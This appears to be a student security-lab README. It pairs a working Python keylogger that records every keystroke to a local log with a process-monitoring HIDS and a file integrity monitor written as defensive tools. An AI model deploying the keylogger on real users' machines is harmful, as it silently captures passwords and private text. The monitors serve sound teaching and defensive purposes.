# RED-BLUE

### Step 1: Make a new folder (in downloads folder) and name it SecLab

Ctrl + Shift + p Type: Phyton: Select Interpreter

  Install Required Python Module:
```bash
pip install pynput
```

### Keylogger.py
```bash

from pynput import keyboard
import os
import logging
from datetime import datetime

# Ensure logs folder exists
os.makedirs("logs", exist_ok=True)

# Log file with timestamp
log_file = f"logs/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Capture key strokes
def on_press(key):
    try:
        logging.info(f"Key: {key.char}")
    except AttributeError:
        logging.info(f"Special: {key}")

# Start keylogger
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

To run:

```bash
cd Keylogger
python keylogger.py
```

##CREATE NEW FOLDER "HIDS"

Type in terminal:
```bash
pip install psutil
```

hids.py
```bash
import psutil
import os
import time
from datetime import datetime
import threading
import tkinter as tk
from tkinter import messagebox, ttk

log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
hids_log = os.path.join(log_dir, "hids_log.txt")

known_browsers = ["chrome", "firefox", "msedge", "iexplore", "opera", "brave", "safari"]
known_apps = known_browsers + ["word", "excel", "powerpoint", "notepad", "photoshop", "teams", "zoom", "vlc"]
seen_pids = set()

class HIDSApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Modern Host-Based IDS Monitor")
        self.root.geometry("950x400")
        style = ttk.Style(self.root)
        style.theme_use("clam")

        title = tk.Label(root, text="Real-Time HIDS Dashboard", font=("Segoe UI", 20, "bold"), fg="#2e7d32")
        title.pack(pady=10)

        self.tree = ttk.Treeview(root, 
                         columns=("Time", "Process", "PID", "Status", "CMD"), 
                         show="headings", height=16)
        self.tree.pack(fill=tk.BOTH, expand=True)
        for col in self.tree["columns"]:
            self.tree.heading(col, text=col)
            self.tree.column(col, anchor=tk.CENTER)
        self.tree.column("Time", width=130)
        self.tree.column("Process", width=160)
        self.tree.column("PID", width=70)
        self.tree.column("Status", width=100)
        self.tree.column("CMD", width=300)

        self.running = True
        threading.Thread(target=self.monitor_thread, daemon=True).start()

    def monitor_thread(self):
        while self.running:
            alert_queue = []
            for proc in psutil.process_iter(['pid', 'name', 'exe', 'cmdline']):
                try:
                    name = (proc.info['name'] or "").lower()
                    pid = proc.info['pid']
                    cmd = " ".join(proc.info.get('cmdline') or [])
                    timestamp = datetime.now().strftime('%H:%M:%S')
                    status = "NORMAL"
                    color = "#2e7d32"
                    alert = False

                    # Only show new events
                    if pid not in seen_pids:
                        if any(app in name for app in known_apps):
                            status = "SUSPICIOUS" if any(b in name for b in known_browsers) else "MONITORED APP"
                            color = "#c62828" if status == "SUSPICIOUS" else "#1565c0"
                            alert = True
                            with open(hids_log, "a") as f:
                                f.write(f"{datetime.now()}: {name} ({pid}) {status} CMD: {cmd}\n")

                            self.tree.insert("", 0, values=(timestamp, name, pid, status, cmd), tags=("alert",))
                            self.tree.tag_configure("alert", foreground=color)
                            if alert:
                                alert_queue.append((name, pid, status))
                        else:
                            self.tree.insert("", 0, values=(timestamp, name, pid, status, cmd), tags=("normal",))
                            self.tree.tag_configure("normal", foreground=color)
                        seen_pids.add(pid)
                except Exception:
                    continue

            # Pop-up any alerts on the main thread
            for name, pid, status in alert_queue:
                self.root.after(0, self.show_popup, name, pid, status)

            time.sleep(1)

    def show_popup(self, name, pid, status):
        # Popup for suspicious process/app on main thread
        messagebox.showwarning(
            "HIDS ALERT!",
            f"Detected:\nProcess: {name}\nPID: {pid}\nStatus: {status}"
        )

    def on_close(self):
        self.running = False
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = HIDSApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()


```

SECLab/
└── FIM/
    ├── fim.py
    ├── logs/
    │   ├── fim_alerts.txt
    │   └── fim_hashes.txt
    └── protected_files/
        ├── config.txt
        └── notes.txt

### CREATE logs, protected_Files folder

## Fim.py

```bash
import os
import hashlib
import time
from datetime import datetime
import shutil
import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
from collections import Counter

LAB_ROOT_DIR = os.path.abspath('.')  # Adjust to specific folder or drive if needed
BACKUP_DIR = "backups"
HASH_DB = "logs/fim_hashes.txt"
ALERT_LOG = "logs/fim_alerts.txt"

os.makedirs("logs", exist_ok=True)
os.makedirs(BACKUP_DIR, exist_ok=True)

def get_hash(path):
    try:
        with open(path, 'rb') as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return None

def load_hashes():
    if not os.path.exists(HASH_DB):
        return {}
    with open(HASH_DB) as f:
        lines = f.read().splitlines()
        hashes = {}
        for line in lines:
            try:
                path, h = line.split(" || ")
                hashes[path] = h
            except Exception:
                continue
        return hashes

def save_hashes(hashes):
    with open(HASH_DB, 'w') as f:
        for path, h in hashes.items():
            f.write(f"{path} || {h}\n")

def log_alert(event, path):
    line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {event.upper()}: {path}"
    with open(ALERT_LOG, 'a') as f:
        f.write(line + "\n")
    return line

def backup_file(path):
    backup_path = os.path.join(BACKUP_DIR, os.path.relpath(path, LAB_ROOT_DIR).replace(os.sep, "_"))
    try:
        shutil.copy2(path, backup_path)
    except Exception:
        pass

def restore_file(path):
    backup_path = os.path.join(BACKUP_DIR, os.path.relpath(path, LAB_ROOT_DIR).replace(os.sep, "_"))
    if os.path.exists(backup_path):
        try:
            shutil.copy2(backup_path, path)
            return f"Restored: {path} from backup"
        except Exception:
            return "Failed to restore: admin rights or locked file."
    return "No backup available for this file."

def initial_backup(files):
    for path in files:
        backup_file(path)

def get_event_counts():
    if not os.path.exists(ALERT_LOG):
        return Counter()
    with open(ALERT_LOG) as f:
        events = []
        for line in f:
            if ":" in line:
                eventtype = line.split("]")[1].split(":")[0].strip()
                file = ":".join(line.split(":")[2:]).strip()
                events.append((eventtype, file))
        return Counter(events)

class FIMApp:
    def __init__(self, root):
        self.root = root
        self.root.title("File Integrity Monitor - Modern SOC Dashboard")
        self.root.geometry("1250x650")
        style = ttk.Style(self.root)
        style.theme_use("clam")

        title = tk.Label(root, text="Real-Time File Integrity Dashboard", font=("Segoe UI", 22, "bold"), fg="#1976d2")
        title.pack(pady=(14,7))
        sublabel = tk.Label(root, text="Monitoring all changes (add, modify, delete) on all files in your directory and subfolders", 
            font=("Segoe UI", 12), fg="#6d6d6d")
        sublabel.pack(pady=(0,6))

        columns = ("Time", "Event", "File")
        self.tree = ttk.Treeview(root, columns=columns, show="headings", height=24)
        for col in columns:
            self.tree.heading(col, text=col)
            anchor = tk.W if col != "Time" else tk.CENTER
            self.tree.column(col, anchor=anchor)
        self.tree.column("Time", width=170)
        self.tree.column("Event", width=110)
        self.tree.column("File", width=950)
        self.tree.pack(fill=tk.BOTH, expand=True, padx=8)

        button_frame = tk.Frame(root)
        button_frame.pack(pady=(10, 8))

        self.log_button = tk.Button(button_frame, text="View Full Logs", command=self.view_logs, width=17, bg="#eeeeee")
        self.log_button.pack(side=tk.LEFT, padx=8)

        self.clear_button = tk.Button(button_frame, text="Clear Table", command=self.clear_text, width=17, bg="#eeeeee")
        self.clear_button.pack(side=tk.LEFT, padx=8)

        self.export_button = tk.Button(button_frame, text="Export Report", command=self.export_report, width=17, bg="#388e3c", fg="white")
        self.export_button.pack(side=tk.LEFT, padx=8)

        self.restore_button = tk.Button(button_frame, text="Restore Selected File", command=self.restore_selected, width=19, bg="#0d47a1", fg="white")
        self.restore_button.pack(side=tk.LEFT, padx=8)

        self.analytics_button = tk.Button(button_frame, text="Show Analytics", command=self.show_analytics, width=16, bg="#ff9800", fg="white")
        self.analytics_button.pack(side=tk.LEFT, padx=8)

        self.running = True
        self.reported_events = set()
        threading.Thread(target=self.monitor_thread, daemon=True).start()

    def monitor_thread(self):
        previous_hashes = load_hashes()
        while self.running:
            current_hashes = {}
            monitored_files = []
            for rootdir, _, files in os.walk(LAB_ROOT_DIR):
                for file in files:
                    fpath = os.path.join(rootdir, file)
                    if BACKUP_DIR in rootdir or fpath.endswith(HASH_DB) or fpath.endswith(ALERT_LOG):
                        continue
                    h = get_hash(fpath)
                    if h:
                        current_hashes[fpath] = h
                        monitored_files.append(fpath)
            # Initial backup
            if not os.listdir(BACKUP_DIR):
                initial_backup(monitored_files)
            # Deleted events
            for path in previous_hashes:
                if path not in current_hashes:
                    eid = f"deleted:{path}"
                    if eid not in self.reported_events:
                        log_alert("Deleted", path)
                        self.add_event("Deleted", path, "#e53935")
                        self.reported_events.add(eid)
            # Modified events
            for path in previous_hashes:
                if path in current_hashes and current_hashes[path] != previous_hashes[path]:
                    eid = f"modified:{path}"
                    if eid not in self.reported_events:
                        log_alert("Modified", path)
                        self.add_event("Modified", path, "#ffb300")
                        backup_file(path)
                        self.reported_events.add(eid)
            # Added events
            for path in current_hashes:
                if path not in previous_hashes:
                    eid = f"added:{path}"
                    if eid not in self.reported_events:
                        log_alert("Added", path)
                        self.add_event("Added", path, "#43a047")
                        backup_file(path)
                        self.reported_events.add(eid)
            save_hashes(current_hashes)
            previous_hashes = dict(current_hashes)
            time.sleep(1.5)

    def add_event(self, event, file, color="#1976d2"):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.tree.insert("", 0, values=(timestamp, event, file), tags=(event,))
        self.tree.tag_configure("Deleted", foreground="#e53935")
        self.tree.tag_configure("Modified", foreground="#ffb300")
        self.tree.tag_configure("Added", foreground="#43a047")
        self.tree.tag_configure("Restored", foreground="#1976d2")

    def clear_text(self):
        for row in self.tree.get_children():
            self.tree.delete(row)

    def view_logs(self):
        if os.path.exists(ALERT_LOG):
            window = tk.Toplevel(self.root)
            window.title("Complete FIM Alert Log")
            txt = scrolledtext.ScrolledText(window, wrap=tk.WORD, height=30, width=120, font=("Consolas", 10))
            txt.pack()
            with open(ALERT_LOG, 'r') as f:
                logs = f.read()
            txt.insert(tk.END, logs if logs else "No logs yet.")
        else:
            messagebox.showinfo("Logs", "No logs file found.")

    def export_report(self):
        if os.path.exists(ALERT_LOG):
            with open(ALERT_LOG, 'r') as f:
                logs = f.read()
            export_path = filedialog.asksaveasfilename(
                defaultextension=".txt",
                filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")],
                title="Export Report As"
            )
            if export_path:
                with open(export_path, 'w') as out_file:
                    out_file.write(logs)
                messagebox.showinfo("Export Successful", f"Report exported to:\n{export_path}")
        else:
            messagebox.showinfo("Export Report", "No logs to export.")

    def restore_selected(self):
        selected = self.tree.selection()
        if not selected:
            messagebox.showinfo("Restore File", "Please select a file row to restore.")
            return
        values = self.tree.item(selected[0], 'values')
        filepath = values[2]
        result = restore_file(filepath)
        messagebox.showinfo("Restore File", result)
        if result.startswith("Restored"):
            log_alert("Restored", filepath)
            self.add_event("Restored", filepath, "#1976d2")

    def show_analytics(self):
        counts = get_event_counts()
        file_counter = Counter()
        event_counter = Counter()
        for (event, file), cnt in counts.items():
            file_counter[file] += cnt
            event_counter[event] += cnt
        top_files = file_counter.most_common(5)
        top_events = event_counter.most_common()
        msg = "Top Targeted/Deleted/Modified Files:\n"
        for f, cnt in top_files:
            msg += f"{f} - {cnt} events\n"
        msg += "\nEvent Summary:\n"
        for evt, cnt in top_events:
            msg += f"{evt}: {cnt}\n"
        messagebox.showinfo("FIM Analytics", msg)

    def on_close(self):
        self.running = False
        self.root.destroy()

if __name__ == "__main__":
    root = tk.Tk()
    app = FIMApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()

```

To run:
```bash
python fim.py
```

#### then create any txt file in the protected files, see the changes in fim_alerts.


